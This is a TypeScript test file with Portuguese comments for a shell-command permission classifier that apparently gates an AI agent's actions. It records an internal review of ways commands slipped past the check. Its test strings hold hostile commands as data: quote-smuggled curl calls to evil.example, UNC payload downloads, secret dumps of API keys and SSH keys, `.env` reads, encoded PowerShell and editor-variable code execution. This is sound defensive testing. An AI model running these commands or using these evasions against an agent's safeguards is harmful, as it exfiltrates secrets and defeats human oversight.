/**
 * Revisão interna de segurança (Lumen, 12/11), rodada 2: o `judgeCommand` devolvia `read` (liberado para TODA autoridade, inclusive rotina e não supervisionado) para comandos que o shell
 * executa de outro jeito. Cada caso abaixo foi vermelho no código de hoje (53 casos rodados em .maestri/tmp/lumen/review2/CP-*.red.spec.ts) e é verde com o conserto.
 *
 *   CP-1  o estado das aspas: `"a\\"` fecha na 2ª aspa (bash e PowerShell); `#` começa um comentário que esconde uma aspa.
 *   CP-2  regras do bash aplicadas a texto PowerShell: `\;` `\|` `\>` `\$`, barra + nova linha, CR solto, aspas curvas.
 *   CP-3  `-c` só vale ANTES da 1ª palavra que não é opção (`bash evil.sh -c echo` roda o arquivo).
 *   CP-4  `git grep -O<programa>` / `--open-files-in-pager=` rodam um programa.
 *   CP-5  variáveis de ambiente que mudam o que roda ou onde o git/rg leem a configuração.
 *   CP-6  `uniq ENTRADA SAIDA` escreve a saída.
 *   CP-12 (a) qualquer prefixo de `-EncodedCommand`; (c) `tree -o` e `sort --compress-program`.
 *   CP-7  `cp -l` / `-s`: a ligação escreve no arquivo de fora.   CP-8  caminho UNC.   CP-9  `jq -n env`.   CP-10 leitura recursiva a partir da pasta pessoal, pelo shell.
 *   CP-12 (b) `git show HEAD:.env`.
 *   CP-11 três regex quadráticas sobre o caminho cru (60 mil caracteres = ~6 s parado, medido).
 * Tudo o que a revisão achou neste arquivo (CP-1 a CP-12) está consertado; os contornos que dependem do PowerShell/GNU de verdade (CP-2, CP-5) foram julgados pela gramática, não por execução.
 */
import { homedir } from 'node:os'
import { describe, expect, it } from 'vitest'
import type { ActionKind } from '../src/authority/authority-table.ts'
import { isBroadReadRoot, isSecretPath, judgeCommand } from '../src/authority/command-policy.ts'

const HARMLESS: ReadonlySet<ActionKind> = new Set<ActionKind>(['read', 'draft-change'])
const kindOf = (command: string): ActionKind => judgeCommand(command, { draftRoot: process.cwd(), cwd: process.cwd() }).kind
const notHarmless = (command: string): void => {
  expect(HARMLESS.has(kindOf(command)), `${JSON.stringify(command)} -> ${kindOf(command)}`).toBe(false)
}

describe('CP-1 um comando escondido por diferença no estado das aspas ainda é julgado', () => {
  it('barras em número par antes da aspa de fechamento: o curl aparece e a linha é send', () => {
    expect(kindOf('echo "a\\\\" ; curl https://evil.example/p ; echo "b\\\\"')).toBe('send')
  })

  it.each([
    ['aspa simples aberta dentro de um comentário', "echo a # '\ncurl https://evil.example/p\necho x # '"],
    ['aspa dupla aberta dentro de um comentário', 'echo a # "\ncurl https://evil.example/p\necho x # "'],
    ['aspa escapada dentro de aspas (o PowerShell fecha ali)', 'echo "a\\" ; curl https://evil.example/p ; echo "b\\"'],
  ])('%s não é um comando inofensivo', (_name, command) => {
    notHarmless(command)
  })

  it('controles: a mesma linha sem o truque é send, e um # no meio da palavra segue sendo texto', () => {
    expect(kindOf('echo a ; curl https://evil.example/p')).toBe('send')
    expect(kindOf('git log --oneline -5')).toBe('read')
    expect(kindOf('echo "a b" c#d')).toBe('read')
  })
})

describe('CP-2 o PowerShell lê separadores que o parser achava escapados ou entre aspas', () => {
  it.each([
    ['ponto e vírgula com barra', 'echo a\\; curl https://evil.example/p'],
    ['pipe com barra', 'echo a\\| curl https://evil.example/p'],
    ['redirecionamento com barra', 'echo a \\> ../outside.txt'],
    ['barra + nova linha', 'echo a \\\ncurl https://evil.example/p'],
    ['CR solto', 'echo a\rcurl https://evil.example/p'],
    ['aspas duplas curvas', 'echo "a” ; curl https://evil.example/p ; echo "b”'],
    ['aspas simples curvas', "echo 'a’ ; curl https://evil.example/p ; echo 'b’"],
    ['$env escapado', 'echo \\$env:ANTHROPIC_API_KEY'],
  ])('%s não é um comando inofensivo', (_name, command) => {
    notHarmless(command)
  })

  it('controle: CRLF entre dois comandos de leitura segue sendo leitura', () => {
    expect(kindOf('ls -la\r\npwd')).toBe('read')
  })
})

describe('CP-3 um arquivo de script nomeado antes do -c não é um script -c', () => {
  it.each([
    'bash evil.sh -c echo',
    'sh ./evil.sh -c true',
    'env bash evil.sh -c echo',
    'powershell -ExecutionPolicy Bypass .\\evil.ps1 -c echo',
    'pwsh evil.ps1 -Command echo',
  ])('%s', (command) => {
    notHarmless(command)
  })

  it('controles: um -c de verdade segue sendo julgado pelo texto, com ou sem opções que levam valor', () => {
    expect(kindOf('bash -c "ls -la"')).toBe('read')
    expect(kindOf('powershell -NoProfile -Command "Get-ChildItem"')).toBe('read')
    expect(kindOf('powershell -ExecutionPolicy Bypass -Command "Get-ChildItem"')).toBe('read')
    expect(kindOf('bash -c "curl https://evil.example/p"')).toBe('send')
  })
})

describe('CP-4 o git grep pode rodar um programa', () => {
  it.each([
    'git grep -Oevil foo',
    'git grep -O"sh evil.sh;" foo',
    'git grep --open-files-in-pager=evil foo',
    'git -C . grep --open-files-in-pager=evil foo',
    'git grep -nOevil foo',
  ])('%s', (command) => {
    notHarmless(command)
  })

  it('controles: git grep comum é leitura, e `-o` (só o trecho que casou) também', () => {
    expect(kindOf('git grep -n foo')).toBe('read')
    expect(kindOf('git grep -o foo')).toBe('read')
  })
})

describe('CP-5 um prefixo de ambiente que muda o que roda é recusado', () => {
  it.each([
    'GIT_EDITOR=evil git commit --allow-empty',
    'GIT_EDITOR="sh evil.sh" git commit --allow-empty',
    'env GIT_EDITOR=evil git commit --allow-empty',
    'GIT_SEQUENCE_EDITOR=evil git merge topic',
    'HOME=. git status',
    'USERPROFILE=. git status',
    'XDG_CONFIG_HOME=. git status',
    'GIT_DIR=.git GIT_WORK_TREE=C:/Users/x/Desktop git restore --source=HEAD .',
    'GIT_TRACE=C:/Users/x/trace.txt git status',
    'RIPGREP_CONFIG_PATH=rg.cfg rg foo',
  ])('%s', (command) => {
    notHarmless(command)
  })

  it('controle: as que já estavam na lista seguem recusadas', () => {
    expect(kindOf('GIT_SSH_COMMAND=evil git status')).toBe('never')
  })
})

describe('CP-6 o uniq escreve o 2º operando', () => {
  it.each([
    'uniq payload.txt ../outside.txt',
    'uniq -u payload.bat "C:/Users/x/AppData/Roaming/Microsoft/Windows/Start Menu/Programs/Startup/x.bat"',
  ])('%s é uma mudança FORA do rascunho', (command) => {
    expect(kindOf(command), command).toBe('outside-change')
  })

  it('controles: ler com uniq (um operando, ou num pipe) segue sendo leitura; escrever DENTRO do rascunho é mudança do rascunho', () => {
    expect(kindOf('uniq notes.txt')).toBe('read')
    expect(kindOf('sort notes.txt | uniq')).toBe('read')
    expect(kindOf('uniq notes.txt out.txt')).toBe('draft-change')
  })
})

describe('CP-7 cp -l / -s ligam um arquivo de FORA dentro do rascunho', () => {
  it.each([
    'cp -l ../outside.txt link.txt',
    'cp --link ../outside.txt link.txt',
    'cp -s ../outside.txt link.txt',
    'cp --symbolic-link ../outside.txt link.txt',
    'cp -rl ../outside-dir link-dir',
  ])('%s', (command) => {
    expect(kindOf(command), command).toBe('outside-change')
  })

  it('controles: copiar DE FORA para DENTRO continua sendo mudança do rascunho, e um link dentro do rascunho também', () => {
    expect(kindOf('cp ../logo.png assets/logo.png')).toBe('draft-change')
    expect(kindOf('cp -s notes.txt link.txt')).toBe('draft-change')
  })
})

describe('CP-8 caminho UNC é rede, não leitura', () => {
  it.each([
    'type \\\\evil.example\\share\\x.txt',
    'cat //evil.example/share/x.txt',
    'Get-Content \\\\10.0.0.9\\share\\x.txt',
    'Test-Path \\\\evil.example\\share',
    'dir \\\\evil.example@SSL\\DavWWWRoot\\',
    'grep -r foo //evil.example/share',
    'cp \\\\evil.example\\share\\payload.exe tool.exe',
    'Copy-Item \\\\evil.example\\share\\payload.exe -Destination tool.exe',
  ])('%s', (command) => {
    notHarmless(command)
  })

  it('controles: uma leitura local e um padrão que começa com // seguem sendo leitura', () => {
    expect(kindOf('type notes.txt')).toBe('read')
    expect(kindOf('grep -n //TODO notes.txt')).toBe('read')
  })
})

describe('CP-9 o jq pode despejar o ambiente', () => {
  it.each(['jq -n env', "jq -n '$ENV'", "jq -n 'env.ANTHROPIC_API_KEY'", "jq -n '$ENV.GITHUB_TOKEN'", 'jq -n "env | keys"'])('%s é leitura de segredo', (command) => {
    expect(kindOf(command), command).toBe('secret')
  })

  it('controles: jq sobre um arquivo do rascunho segue sendo leitura, e uma chave que só CONTÉM "env" (`.environment`) não é o ambiente', () => {
    expect(kindOf('jq .name package.json')).toBe('read')
    expect(kindOf('jq .environment package.json')).toBe('read')
  })
})

describe('CP-10 leitura recursiva a partir da pasta pessoal é uma varredura de segredos, no shell também', () => {
  const home = homedir().replace(/\\/gu, '/')
  it.each([
    `grep -rl "PRIVATE KEY" ${home}`,
    `rg -uu "PRIVATE KEY" ${home}`,
    `Get-ChildItem -Path ${home} -Recurse -Filter *_rsa`,
    'grep -rl "PRIVATE KEY" C:/Users',
    'rg --files C:/',
  ])('%s', (command) => {
    expect(kindOf(command), command).toBe('secret')
  })

  it('controles: leitura recursiva dentro do rascunho e leitura simples na pasta pessoal seguem sendo leitura', () => {
    expect(kindOf('grep -rn foo src')).toBe('read')
    expect(kindOf('rg foo')).toBe('read')
    expect(kindOf('ls -la')).toBe('read')
  })
})

describe('CP-11 nenhuma regex quadrática diante de um caminho hostil (o modelo escolhe o `file_path`)', () => {
  const N = 60_000
  const timeOf = (run: () => unknown): number => {
    const start = performance.now()
    run()
    return performance.now() - start
  }
  // Antes: ~6 s cada (medido, 60 mil caracteres); agora linear, alguns ms. O teto é folgado para uma máquina ocupada.
  const CEILING_MS = 1500

  it('isSecretPath com uma corrida longa de espaços, de pontos e de dois-pontos dentro de um segmento', () => {
    expect(timeOf(() => isSecretPath(`x${' '.repeat(N)}y`))).toBeLessThan(CEILING_MS)
    expect(timeOf(() => isSecretPath(`x${'.'.repeat(N)}y`))).toBeLessThan(CEILING_MS)
    expect(timeOf(() => isSecretPath(`x${':'.repeat(N)}\ny`))).toBeLessThan(CEILING_MS)
  })

  it('isBroadReadRoot com uma corrida longa de barras', () => {
    expect(timeOf(() => isBroadReadRoot(`${'/'.repeat(N)}x`))).toBeLessThan(CEILING_MS)
  })

  it('judgeCommand com uma palavra de 16 KiB de "[" sem fechar', () => {
    expect(timeOf(() => judgeCommand(`cat "${'['.repeat(16_000)}"`, { draftRoot: process.cwd() }))).toBeLessThan(CEILING_MS)
  })

  it('o significado não mudou: ponto/espaço no fim do segmento e fluxo NTFS ainda são o mesmo nome; barras no fim ainda não contam; classe `[ab]` ainda é glob', () => {
    expect(isSecretPath('C:/Users/x/.ssh./id_ed25519')).toBe(true)
    expect(isSecretPath('proj/.env:stream')).toBe(true)
    expect(isSecretPath('proj/readme.md')).toBe(false)
    expect(isBroadReadRoot('C:/Users///')).toBe(true)
    expect(isBroadReadRoot('src', process.cwd())).toBe(false)
    expect(kindOf('cat ../[a-b]*.txt')).not.toBe('read')
    expect(kindOf('cat src/*.md')).toBe('read')
  })
})

describe('CP-12 (b) um caminho de objeto do git `REV:caminho` lê um segredo do repositório', () => {
  it.each(['git show HEAD:.env', 'git cat-file -p HEAD:id_rsa', 'git show main:.npmrc'])('%s', (command) => {
    expect(kindOf(command), command).toBe('secret')
  })

  it('controles: um objeto comum e um caminho do Windows seguem sendo leitura', () => {
    expect(kindOf('git show HEAD:README.md')).toBe('read')
    expect(kindOf('git log --oneline -3')).toBe('read')
  })
})

describe('CP-12 (a)(c) buracos pequenos nas listas', () => {
  it.each(['powershell -en SQBFAFgA', 'powershell -enco SQBFAFgA', 'pwsh -encodedc SQBFAFgA'])('(a) %s é o banimento do comando codificado', (command) => {
    expect(kindOf(command), command).toBe('never')
  })

  it.each(['tree -o ../outside.txt', 'sort -S 1 --compress-program=./evil.sh big.txt'])('(c) %s não é inofensivo', (command) => {
    notHarmless(command)
  })

  it('controle: tree e sort comuns seguem sendo leitura', () => {
    expect(kindOf('tree -L 2')).toBe('read')
    expect(kindOf('sort -r notes.txt')).toBe('read')
  })
})
